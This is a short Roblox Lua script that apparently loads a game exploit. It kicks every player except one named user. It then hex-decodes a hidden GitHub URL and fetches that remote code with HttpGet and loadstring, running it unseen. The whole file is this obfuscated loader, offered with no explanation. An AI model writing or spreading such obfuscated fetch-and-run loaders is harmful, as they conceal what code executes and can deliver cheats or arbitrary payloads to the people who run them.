local p=game:GetService("Players").LocalPlayer
if p.Name~="Rennn571"then p:Kick("Access Denied") return end

local function d(s)local r=""for i=1,#s,2 do r=r..string.char(tonumber(s:sub(i,i+1),16))end return r end
local u="68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f616469747061636b65642f70726962616469746f69722f726566732f68656164732f6d61696e2f54504461756e4c6f636b4944"
loadstring(game:HttpGet(d(u)))()
